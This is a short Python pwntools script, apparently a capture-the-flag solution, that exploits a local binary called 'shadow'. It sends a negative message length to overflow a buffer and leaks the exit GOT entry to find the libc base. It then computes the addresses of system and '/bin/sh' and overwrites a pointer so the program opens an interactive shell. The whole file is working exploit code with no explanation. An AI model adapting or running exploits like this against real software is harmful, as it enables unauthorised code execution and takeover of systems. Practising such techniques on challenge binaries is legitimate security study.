from pwn import *


p = process("./shadow")

exit_got = 0x08049FD8

p.recvuntil("Input name : ")
p.send("A"*16)
p.recvuntil("Message length : ")
p.sendline("2")
p.recvuntil("Input message : ")
p.sendline("A")

context.log_level='debug'
p.recvuntil("A"*16)
addr = u32(p.recv(16)[12:]) - 0x100

pay = "A"*52 + p32(exit_got) + p32(0x400) + p32(0x400)

p.recvuntil("Change name? (y/n) : ")
p.send("n")
p.recvuntil("Message length : ")
p.sendline("-1")
p.recvuntil("Input message : ")
p.sendline(pay)

p.recvuntil("<")

exit_libc = u32(p.recv(4)[0:])

libc = exit_libc - 0xb07c8 # _exit
system = libc + 0x3ada0 # system
binsh = libc + 0x15b9a8 + 3 # binsh

pay = "A"*52 + p32(addr) + p32(0x400) + p32(0x400)

p.recvuntil("Change name? (y/n) : ")
p.send("n")
p.recvuntil("Message length : ")
p.sendline("-1")
p.recvuntil("Input message : ")
p.sendline(pay)

p.recvuntil("Input name : ")
p.sendline(p32(system) + "AAAA" + p32(binsh))
p.interactive()
